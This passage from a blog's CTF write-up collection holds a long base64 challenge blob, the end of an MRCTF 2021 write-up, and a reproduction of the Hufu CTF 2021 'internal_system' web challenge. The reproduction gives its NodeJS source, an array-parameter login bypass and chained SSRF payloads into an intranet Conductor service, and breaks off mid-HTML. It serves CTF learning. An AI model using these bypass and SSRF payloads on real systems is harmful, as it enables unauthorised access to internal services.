ZXVm5WVWJHaFlVakZLV2xkWGVHOVZNVnBYVm01R1VtSlZXbFZWYlRFMFpWWlplVTVYZEdoU2JIQXdWbGQwYzFkc1dsaFVWRVpYWVd0d1RGWXhXa2RqYlVaSFkwZDRhRTB3U2xGV01uaFhZVEZSZUZOdVVsTmhNbEpUV1d0a1UyTkdXblJrU0dSWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdOV1RuSmtSbEpUWWtad05WWkVSbUZXTVZsNVUydHNVbUpVYkZoWlYzUkxZMnhhU0UxV1pHdFNhM0I1VjJ0a2IxVXlSalpXYm1SWFZucENNMVJzVlRGU01XUlpZVVphYUUxRVZtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZa2RTU2xWWGRHOVdNREZIWTBod1YwMUhVbFJWYlRGVFUwZE9TR0pHVG1sU00xRXhWbTE0YW1WSFZuSk9WbVJYVjBkU1QxWnRNVk5qVmxaeVZtMUdXRkpzY0hoV1J6QTFWbXhLZEdWR2FGZE5ibEl6V1d0YVMyTnJOVlZTYkdob1RWaENlVmRXV21GaE1VbDRWRzVPYVZKdFVuQldhMVpLVFVaYWMxa3phRmROVld3MFdUQldjMVl5U2taT1dFSldZa2RvUkZwRVJtRmtSMVpJVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0Vm1WR1dYZFhiSEJzVmpGYVNWUXhaRzlVYkZwWVQwaHNXRll6VW5GVWJGcGhWakZrZFZSc2FHaGhlbFpYVm0xNFlXUXlSa2RYV0dSaFVsUnNVRmxyV25kbGJHUnlWbFJHYUZKVVJscFZWbEpIVmpKS1dWRnJlRlZXVmxWNFZXcEdhMlJXVG5KT1ZtaFRZa2hDTWxac1VrTldNbEY0V2tWa2FWSnRhSEpWYWtKaFlqRldkRTVWVGxOTlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1IwcElaVWM1Vm1GclNtaFdhMXBoWTFaT2RFOVdaR2xTTVVwYVYydFdhMDFIUmxaTldFcHBVa1pLV0Zsc1VsZFdSbHBJWlVkR1QySlZjRWxWYlhocllWWmFSbFpZWkZkaVZFVXdWbXBLVTFKck5WZGhSM1JUWWtad2RsZHNaREJaVm1SWFdrWm9hMUpyTlZaVVZscHpUVEZTVjJGRlpGZE5hMVkyV1ZWa1IxZHNXa1pYYWs1WFVsWndNMVZ0ZUd0ak1YQklaRVprVGxORlNrdFdiR040VGtaUmVGZFlaRTVXYkhCWlZqQm9RMWRHYkhOaFJ6bFhVbXhaTWxWdGREQmhNVXB6WTBSR1YxSXphRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWbXhTUzFReFNYaFhibFpUWWtVMWIxUldhRU5sVmxwSFYyMTBWazFYVWtoV01uaHZZVEZLUmxOc1pGVldWa3BJVmpGYVlWZEhVa2hQVm1Sb1pXdFplRmRXVm05a01XUkhWMjVPYWxKWVVtaFdhazV2VTBac05sSnNaR3BOV0VKSldWVmtiMkpIU2tkaVJGWlhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDJWc1dsaGtSMFpWWWtWd01GWlhlR0ZXYkZvMlVtdG9WMDF1YUdoWmVrcExVbFpXYzJGSGFFNVdia0Y1VmpGYVYxbFdUWGxVV0doVlltczFXVmxyWkZOalJscHlWbTFHVjFac2NEQmFSV1JIWVRBeFdGVnJiRmRpV0ZKNlZteGtTMU5HVm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHeGtWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyRkdaRmRhUldSWFRWZFNXbGxyWkc5Vk1rcFlZVVp3V0ZZelVuSldWekZTWlVad1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadGRITk9SbFY1VGxjNVYwMVZjREJXVm1oclYwWmFjMk5GZEdGV1ZuQllWakZrUjFJeVJraGlSbWhUWVROQmVsWnRlR3RrTVVWNVZWaG9ZVk5GTlhCVmJYaDNWMVpzVlZOc1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUZVV3hrVjAweWFGRldNVnBoV1ZkTmVWUnJhR2hTYmtKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhWa3B5VGxac1ZtSkdXak5XVkVaaFpFVXhTVnBIZUZOV1JscEtWbGQ0YjJJeFdYaGFSV2hvVW0xNFdGUlZaRk5rYkZweFVtNU9hbUpJUWtsVU1XUjNZVlpLYzFkWWNGZE5ibEpvVmtSR2ExSXhUblZVYkZKcFVqSm9XbGRXVWtkVE1WcEhZa2hLV0dKVlduRlVWM014VTBac2NsZHNaRmROYTNCSVdUQm9jMVl5Um5KVGJXaFdaV3R3VUZwRldrOWpiRnB6Vm0xc1UwMVZjRE5XYlhCRFZqRk5lRmRzWkZoaWExcFZXVzAxUTJNeFZuUmpla1pVVm14YU1GcEZaRWRoVmtweVkwUkNWMVl6VFRGV01qRkxWbFpLZFZkc2NHaGhNWEJ2VjFSR1lWSXlVa2RUYms1aFVsUldiMXBYZUZwTmJGbDRWV3RPVjAxcmJEUldiR2h6VmtkRmVXRkdaRnBoTWxKMlZtMTRZV1JIVmtoU2F6Vk9WbTVDV2xkc1ZtdFNNa1p5VFZaa1dHSnRlRmhWYm5CSFpHeGFTR1ZIUmxoU01Va3lWVmQ0YTFZeFNsZGpSRXBZVjBoQ1NGWnRNVmRXTVU1ellrZHNVMDF0YUZaV1YzaFhaREZrUjFwR2FHeFNlbXhXV1d4YVlWTkdiRlZVYlhSWVVqQndlVlJzV205V01rcFpWVzFvVlZac2NISlpNbmhoVmxaS2RHRkdaR2hOTUVZMFZteGFZV0l5UlhoWFdHaFVZbXMxY1ZWdGVFdFdNVnB5Vm0xR2FGSnRkRFZaZWs1dlZqQXhXRlZ1YkZWaVJuQnlWbFJLUm1Wc1JuTmpSbVJwVmtWR05GZHJVa2RYYlZaSFdraEtZVkp0YUhCWlZFWjNWbXhrVjFWck9WWk5WbkJZVm0wMVUySkdTWGRYYms1YVlURndlbFJzV25kV2JVWklaRWRvVTJKSVFYZFdiR1F3WWpGYWNrMVdhR2hTUlRWWVZGVmFkMWxXY0ZobFJXUnFZbFZhU0ZkclpHOWhSVEIzVTJ4S1YySlVSak5WYWtaV1pWWldjMXBHWkdsaGVsWlVWMWQwYTFVeVRrZFhibEpyVTBkU1dGbHJXbk5PUm1SeVZXeE9hRlpVUm5sWmExSlRWMjFGZUdOSVNsaFdiSEJNV1hwR2EyTXhVbk5qUjJ4VFlraENkbFl4WkhkU01WVjRXa1ZvVm1FeVVtaFZiRkpYVkRGYWRHUklaRmhXYkhCNFZURm9iMVJzU1hkWGEyeFdUVzVTYUZaRVJtRlhSMVpJVW14a2FWSnVRWHBYVkVvMFdWZE9WMVJ1U210U00xSllXVlJHZDA1V1dYbGtSM1JUVFZaV05GVXllR3RoYkVwSFkwWm9XbUpIYUVSVk1GcHJWakZrZEdSR2FGTmhNMEkxVmpKMGEySXhWWGxTYWxwWFltMVNXRlp1Y0VKbFJsWllZek5vYWsxWFVscFpWVnB2WVZaSmVGTnRhRmRpV0VKRVZtcEJNVkl4WkhOaFJUbFhWa2Q0V2xaWE1IaFZNVTVYWTBaYVdtVnNXbGhaYkZaWFRrWlplV05GT1ZkTlJFWklXVEJvZDFZd01VaFZiRkpXWWxSR1ZGVXdaRTlUUjBwSFZHMXNVMDB4UlhoV2JURTBZVzFSZVZacldrNVdWMUpaVmpCa1UxUXhXblJOVms1cVZteGFlVlp0TVVkWFJrcDBaVWh3V2xaWFRURldNRnBMWkVkV1IyRkdaRTVpYXpCNFZteFNTMU14U25KT1ZteHFVbTVDVDFWdE5VTmxWbHAwWTBWa1ZFMVdjREJXUjNScllWWktkRlZzYkZaTlJscE1WVEZhWVdOc1ZuSmFSbWhwVm14d1NWZFVRbGRqTVZsNVUydGFUMWRGU2xkWmExcExWMFp3UlZKdFJtdFNNVnBKVlcweE1GUnRSWGhqUld4WFlXdHJlRlpVUmxOak1YQkdZa1pLYUdWdGVGbFhWM2h2VkcxV1IxZFlaRmhpU0VKelZteFNWMWRHV2toTlZ6bFZZa1p3V1ZRd2FITlhSbGw2Vlc1R1ZXSkdjR2hXYWtaclpGWlNjMkZIYkdsaE1IQllWakZrTUZsWFVYbFdiazVZWW14S1QxWnNaRk5XUm14eVYydDBiR0pIVW5sWGEyaFBWakF4V0ZWclpGWk5ibEYzVm1wQmVGWXlUa2RoUm1Sb1lURndXRmRzVm1GaE1rMTVVbXRrVm1KWGVGUlVWRXB2VFd4YWMxVnJUbGROYkVZMFYydFdhMkZXVGtaalJteGFZbFJHVkZac1dsZGtSVFZXVkd4T1RsWnRkekZYYTFaVFVUSkdSazFXV21sU1JUVldXV3RhWVdOc1duTmFSWFJUVFdzMVNsVXllR3RWTURCNVlVYzVWMkZyU25KV1Z6RlhaRVpTY2xwSFJsTk5ibWhhVmxkd1MySXhXbk5YYms1b1UwZFNVMWxzV21GVFJscElaRWQwVjFZd2NFbGFWV2hEVm0xS1dWUllhRnBoYTFwVVZqQmtWMUp0VWtkYVIyeFRUVlZ3WVZacldtRmlNbEY0Vlc1T1dHSnJOWEZWYlRGdldWWnNWVk50T1ZaU2JIQjRWVEowTUZZeVNraFZibkJhVmxad00xbFZWWGhYVmtaWlkwWmtVMkpHY0c5WGExSkhXVmRTUjFOdVNtaFNNMUpVV1d0YWQyUnNaSE5hUkVKYVZtMVNXRmRyV2xkVmJVcFZZa2hHVlZac2NIcFVWRVpUVmpKR1JscEdXazVoTVZreFYxWldhMUl4V1hsU2JrcFBWMFp3WVZac1duZGxWbkJYVmxob1YyRjZiRmhXUjNocllVVXdkMU5VU2xkTlZuQllXVlJLU21WR1ZuVlViVVpUVm01Q1ZsZFhkRmRrTVdSSFlraE9hRkpyTlhGWmExcExaVlpaZVU1Vk9WaFNhM0I2VlRKd1IxWXhXWHBoUm1oYVZsWldORlpxU2s5U01rcEhZVVprVGsxVmNEVldiWGhUVWpGc1YxTllhRmRpYXpWWVdXdGFTMk5HV25KYVJGSnJUVlp3U0ZZeU1VZGhNREZ6VjJ4b1YwMXVhSFpaVkVaTFVteE9jMXBHVmxkV2EzQkpWbXBDWVdNeVRuTldiazVWWWtkU1QxWnNZelJsVmxwMFRWUlNVazFYVW5wV01qVlBZV3hLV1dGSFJsVldNMEpJVmxWYVYyTldUbkphUms1T1ZqRkpkMWRYZEdGVU1WSjBVMnhvYUZKWFVsaFpiRkpIVFRGV2NWSnVUbGhTYTNCYVdWVmtSMVV4V1hsaFJteFlWbXhLVEZaVVJtRmpNa3BKVTJ4a1YxSldjSGRXUmxwdlVURmtWMk5GV21GU1YxSllWVzE0ZDJWc2EzZGhSemxYWVhwR01WVlhlRk5XTWtaeVVtcFNWMkZyV21oWk1WcGhZekZrZEdKR1RrNWlWMUV5Vm0weE5HRnRWa2RVV0d4VlltdHdVRlp0TVZOaFJsWjBUbFZPYWxKc1dqQmFSV2hyVmtaYWMyTkVRbUZTVjFKSVZqQmtTMVl4WkhOaVJtUnBWMFpLTWxkV1VrZFRiVlp6VW01V1VtSkdjSEJXYTFwaFVsWmFkR05GWkZwV2JWSkhWRlphVjFadFNsaGhSVGxYWWxoU01scEVSbUZYUjFaSVQxZDBUbFpzYjNkV1ZFb3dZakpLUjFOdVVtaFNiV2hoVm10V1lXRkdjRmRYYm1SWFlrZFNNVlpITVhkV01rVjZVV3BhV0ZaRlNuSlVhMXBXWlZaT2MxcEdVbWxXVm5CYVZtMTBWMU15VG5OaVNFWlRZbFZhVkZSV1ZURmxiR3h5VjJ0MGFGWnJiRFJWTW5oM1ZqSktWVkpVUWxabGExcFVWV3BHYTJNeFduTlViV2hzWWxob1ZsWnJXbUZaVjFGM1RWWmtWMkpzU25OVmJGSnpZakZhZEUxV1RsUlNiRlkxVkd4b1QxWXdNWEpqUmxwV1lrWktSRlp0TVZkamJVNUhZVVp3YkdFelFrMVdWM0JIWVRKU1IxTnVUbFppUlRWWVZXMTRkbVZXV25STlNHUnNVbFJXU1ZaV2FITldNa3BJVlcwNVZWWkZjRlJXTVZwelpFVXhWMVJzYUZOaVJYQmFWMnRXYjJFeFdrZFhiazVxVWxkNFlWUlZXbmRWUmxweFVteHdhMDFXY0hoV2JYaHJWakF3ZVdGR1JsZE5WbkJvVjFaa1RtVldVbkpoUjJoVFltdEtVRmRYTUhoaWJWWnpWMnhvYWxKWFVuSlVWbFV4VTFaVmVXUkhPV2hXYTNCNVZHeGFjMVp0U2tkWGFrNVhWa1ZhYUZwRlZYaFRWbkJJWlVaT1YxSnNjRXRXYkdRMFlqSkplRmRZYUdGU1YyaHZWV3BLYjFZeGJISmFSazVYVW14d2VGVnROVTloYlVwSVZXcEdXR0V4Y0hKV1IzaGFaVzFHUjFwR1pGZFNWemgzVm10U1MxSXlUbkpOVm1SaFVqTkNWRlZzVm5kaU1WcDBaVWRHV0dKV1JqUlphMmhMV1ZaS1dWVnNVbFZXTTAxNFZXMTRWMWRIVmtkYVJtUk9WbTVDTlZkVVFtRmpNVmw1VTJ4c1VtRXdOV2hXYkZwM1ZFWmFjVkpyT1d0V2JFb3dWVzE0VDJGWFJYZGpSRTVYVFZkT05GUlZXazVsUmxaeldrWm9hV0pGY0ZCV1ZFSnJZakZhVjFWc1pHRlNhelZaVlcxNGQwMUdVbk5YYlhSWVVtdHNNMWt3Vm5OV01WbzJVVlJHVjAxdWFHaFZiWGhyWTFaU2MyTkhhR2hOV0VKMlZtMXdRMVp0VmtkWGJHUlhZbXhLYjFWc1VsZGlNWEJZWlVaa1RrMVdjREJVVldodlZHeEpkMVpxVWxwaE1YQnlWbXRhYTFOSFZraFBWbHBwWW10S05sWnRNVFJaVjA1elYyNUthMUpzV2xSWmEyaERWMnhrYzFadGRGTk5hMXA1VkZaYWIyRXhTa2RqUjBaWFlrWndWMVJXV21GV1ZrNXlaRVpvVjAxR2NFbFhWRUpoWVRKR1JrMVdiRkpoYTNCWlZtcE9RMVJHVm5GVGF6VnNVbXhLTVZaSE1XOVZNREYwWVVaYVYxWXphRmhhUkVaclVqRndSMkZIZUZObGJYaFhWMWQ0WVZsV1RrZFhXR3hyVW0xU1YxUlhkSGRXTVZsNVRsVmtWMVpzY0RCV1YzaFRXVlpaZW1GSWJHRlNSVm96Vld4YVYyUkhSa2RhUjJoT1RVVlpNRlp0ZUdGWlYwbDVVbGhvWVZKWGFGVlpWRXBUVjFac2RHUklaRmROVjNoWldrVmtSMkZHU25Sa1JGWmFaV3MxZGxacVFYaFhSbFp4VVd4d2FFMVlRbEZXYkZKTFVtMVdjMUp1VWxCV2JWSlBWbTAxUTFaV1dsaGpSWFJXWWxaYVdGWlhOVmRXVjBwSVlVWnNWbUZyV2t4WmFrWmhWMGRXU0U5V1drNWhlbFpaVjFkMGIxUXhXWGhYYTFwWVlrWktWbFp0ZUhkVFJsSnlWMnh3YkZaVVJsWlZWekZ2VlRKS1NWRllaRmRpUjFGM1dYcEdhMU5HU25WVGF6bFhVbFJXV1ZkV1pEQmtNVTVIWVROc2JGSlViSEpWYWtKaFUwWnJkMXBFVW1oU1ZFWmFWVmR3VjFZeVNsbFJhMUpZVm14d1YxcFdXbE5rVmxKMFkwWk9WMDF0YUZaV01XUXdWbXN4V0ZSclpGaGliRXB5VlRCa1UxZEdiSEpYYms1UFVtMVNlVlpYZEU5WFIwcEhZa1JTVm1KWVFsQldiR1JMVWpKT1NWTnNaRTVTTVVwTlYxaHdSMVF5VG5KUFZtUmhVakpvVDFadE5VTlViRnB4VW0xR1dsWnRlRmxXVjNSdlZqSkZlR05IYUZaaVJrcDZWbXRhYzJOdFJrWlRiWFJPVmpGS05sWnRNSGhTTWtaR1RWWmthbEp0ZUZkVVZ6VlRZVVpzV0dWRmRGaFNNVnBKVlcxNFYxWXhTbFZXYTFaWVlrWndhRlpxUmtwbFJrNXpWbTFzVTJFeGNGaFdiWFJUVVdzMVVsQlVNRDA9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 把最后的 a 给去掉，然后不停解 base64。 貌似套了22层 base64，就离谱。 MRCTF{bUt_Y0u_c@n_f1yyyyyyyy~} BTW, 官方 WP 这个移位加置位的方式写起来挺方便的。 for i in range(400): for j in range(50): ch = 0 for k in range(8): if judge(pim[i,j*8+k]) == 1: ch |= 1 &lt;&lt; k flag += chr(ch) flag = flag.strip('a') 另外来抄一下 snowywar 师傅求空间平面方程的解法。 import numpy as np mark = [(153, 15, 120),(51, 104, 132),(229, 38, 115)] def define_area(point1, point2, point3): point1 = np.asarray(point1) point2 = np.asarray(point2) point3 = np.asarray(point3) AB = np.asmatrix(point2 - point1) AC = np.asmatrix(point3 - point1) N = np.cross(AB, AC) # 向量叉乘，求法向量 # Ax+By+Cz Ax = N[0, 0] By = N[0, 1] Cz = N[0, 2] D = -(Ax * point1[0] + By * point1[1] + Cz * point1[2]) return -Ax, -By, -Cz, -D res = \"\" a,b,c,d = define_area((153, 15, 120),(51, 104, 132),(229, 38, 115)) print(a,b,c,d) 于是可以得到空间平面方程 Ax+By+Cz+D=0 的系数。 小结太顶了太顶了！ 北邮的师傅们太强了 Orz。 BTW，师傅们自己开发的这个 CTFm 平台还不错，只是可能还比较新的原因还有点小 bug，不过问题不大，慢慢来嘛。 比如 profile 页面这里的名字貌似只是前端做了限制，后端并没有限制来着（虽然图片上没有体现 （比赛的时候就做了两题 + 问卷 check out，然后 rk45，就离谱 噢，官方 WriteUp 也出来了（ MRCTF Misc 官方WriteUp MRCTF2021 Reverse官方wp MRCTF2021 CRYPTO官方wp MRCTF2021 官方ETH&amp;IOT方向Wp MRCTF2021 官方PWN方向Wp （怎么 web 还没有呢 终于有了 MRCTF2021 Web方向Wp 就这样吧。累死了。 （溜了溜了喵","path":"2021/04/15/CTF_2021MRCTF/"},{"title":"CTF | 2021 虎符CTF Web internal_system 复现","text":"引言前几天打了个 2021 数字中国创新大赛虎符网络安全赛道，或者说是 虎符 CTF。 写了几道 Web 的 Writeup 丢在下面这里了。 CTF | 2021 数字中国创新大赛虎符网络安全赛道 WriteUp Web 中还有一道零解的题目，即 internal_system。 正好看到赵总的 buuoj 开了环境，趁着还有兴趣，就来复现一下吧。 环境： [虎符CTF 2021] Internal System 复现过程主要参考了 glzjin 师傅的 虎符 CTF2021 Web 零解题 Internal System WriteUp 题目描述 开发了一个公司内部的请求代理网站，好像有点问题，但来不及了还是先上线吧（─.─||） http://8.140.152.226:47921/ hint: /source存在源码泄露；/proxy存在ssrf StepsStep 01 登录 JS 弱类型绕过访问 /source 得到源码，啊是 NodeJS。 const express = require('express') const router = express.Router() const axios = require('axios') const isIp = require('is-ip') const IP = require('ip') const UrlParse = require('url-parse') const {sha256, hint} = require('./utils') const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin')) const port = process.env.PORT || 3000 function formatResopnse(response) { if(typeof(response) !== typeof('')) { return JSON.stringify(response) } else { return response } } function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get('/', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.redirect('/index') } }) router.get('/login', (req, res, next) =&gt; { const {username, password} = req.query; if(!username || !password || username === password || username.length === password.length || username === 'admin') { res.render('login') } else { const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect('/index') } }) router.get('/index', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.render('index', {admin: req.session.admin}) } }) router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) router.post('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } // test url // not implemented here const url = \"https://postman-echo.com/post\" await axios.post(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', \"Something needs to be implemented\") }) router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) router.get('/source', (req, res, next)=&gt;{ res.sendFile( __dirname + \"/\" + \"route.js\"); }) router.get('/flag', (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'No Flag For You!'}) } return res.json({hint: hint}) }) module.exports = router 首先需要登录，这里用到了 JavaScript 弱类型的特性。 参考 SuSeC CTF 2020 Writeup &amp; 基于Node.JS的sha1绕过分析 以及 Node.js中url.parse函数的潜在安全问题 JavaScript 在使用加号拼接的时候最终会得到一个字符串(string)，于是不会影响 sha256 的处理。 这里是用 GET query 传参，可以构造 payload username[]=admin&amp;password=admin 就能成功以管理员身份进入。 接下来打 ssrf…… Step 02 SSRF 拿 hint登录之后，赵总这里给出了网络接口相关的参数，比赛环境里倒没有，得瞎猜。 不过 docker 内网默认是 172.1x.0.x 开始倒是了。 这里提交的 URL 会调用 GET /proxy 接口。再来看源码。 function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] // ... router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) 这几个 WAF 需要输入的 URL Host 为公网 IP，且目录不以 /flag 开头。 这个 NodeJS 服务默认是开在 3000 端口，但是如果直接访问 http://127.0.0.1:3000/ 会被 WAF 给拦住。 试了试访问自己的 VPS，是能通的。 考虑到机器上的服务一般监听 0.0.0.0，于是构造 URL /proxy?url=http://0.0.0.0:3000/ 成功访问到了当前站点的首页。 我们需要访问的是 /flag，为了绕过 WAF，可以利用 /search 接口。 router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) 构造 payload /proxy?url=http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag {\"title\":\"Search Success\",\"content\":\"{\\\"hint\\\":\\\"someone else also deploy a netflix conductor server in Intranet?\\\"}\"} 提示在内网中有一个 netflix conductor server。 搜一下，这是一个微服务编排工具。 https://github.com/Netflix/conductor https://netflix.github.io/conductor/ Conductor is an orchestration engine that runs in the cloud. Step 03 内网找 Conductor 服务它默认是开在 8080 端口，于是在内网中找一找/扫一扫。 本机上是没有的，在给出的内网网段里找一找，发现有了。 /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080 这是一个 Swagger UI，也就是个 API 接口文档。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Swagger UI&lt;/title&gt; &lt;link rel=\"icon\" type=\"image/png\" href=\"images/favicon-32x32.png\" sizes=\"32x32\" /&gt; &lt;link rel=\"icon\" type=\"image/png\" href=\"images/favicon-16x16.png\" sizes=\"16x16\" /&gt; &lt;link href='css/typography.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/reset.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/screen.css' media='screen' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/reset.css' media='print' rel='stylesheet' type='text/css'/&gt; &lt;link href='css/print.css' media='print' rel='stylesheet' type='text/css'/&gt; &lt;script src='lib/object-assign-pollyfill.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery-1.8.0.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.slideto.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.wiggle.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jquery.ba-bbq.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/handlebars-4.0.5.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/lodash.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/backbone-min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='swagger-ui.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/highlight.9.1.0.pack.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/highlight.9.1.0.pack_extended.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/jsoneditor.min.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/marked.js' type='text/javascript'&gt;&lt;/script&gt; &lt;script src='lib/swagger-oauth.js' type='text/javascript'&gt;&lt;/script&gt; &lt;!-- Some basic translations --&gt; &lt;!-- &lt;script src='lang/translator.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;!-- &lt;script src='lang/ru.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;!-- &lt;script src='lang/en.js' type='text/javascript'&gt;&lt;/script&gt; --&gt; &lt;script type=\"text/javascript\"&gt; $(function () { var url = window.location.search.match(/url=([^&amp;]+)/); //http://127.0.0.1:8080/?url=127.0.0.1:8080 if (url &amp;&amp; url.length &gt; 1) { url = decodeURIComponent(url[1]); if (!url.includes('://')) { url = `http://${url}`; } } else { url = window.location.origin; } hljs.configure({ highlightSizeThreshold: 5000 }); // Pre load translate... if(window.SwaggerTranslator) { window.SwaggerTranslator.translate(); } window.swaggerUi = new 